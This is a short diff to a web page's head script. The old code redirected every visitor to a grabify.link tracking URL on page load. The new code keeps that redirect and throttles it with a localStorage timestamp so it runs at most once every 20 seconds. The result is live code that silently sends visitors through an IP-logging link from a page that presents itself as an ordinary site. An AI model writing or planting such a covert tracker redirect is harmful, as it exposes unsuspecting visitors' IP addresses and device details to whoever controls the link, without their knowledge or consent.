@@ -17,7 +17,16 @@
     <link rel="icon" href="/images/icon.png" type="image/png" />
     <link rel="stylesheet" href="/style.css" />
     <script>
-      window.location.href = "https://grabify.link/QUEJBJ";
+      const now = Date.now();
+      const lastRedirect = localStorage.getItem("lastRedirect");
+
+      // If no redirect happened yet, or more than 20 seconds passed
+      if (!lastRedirect || now - lastRedirect > 20000) {
+        localStorage.setItem("lastRedirect", now);
+        window.location.href = "https://grabify.link/QUEJBJ";
+      } else {
+        console.log("Redirect skipped — less than 20 seconds since last.");
+      }
     </script>
   </head>
   <body>
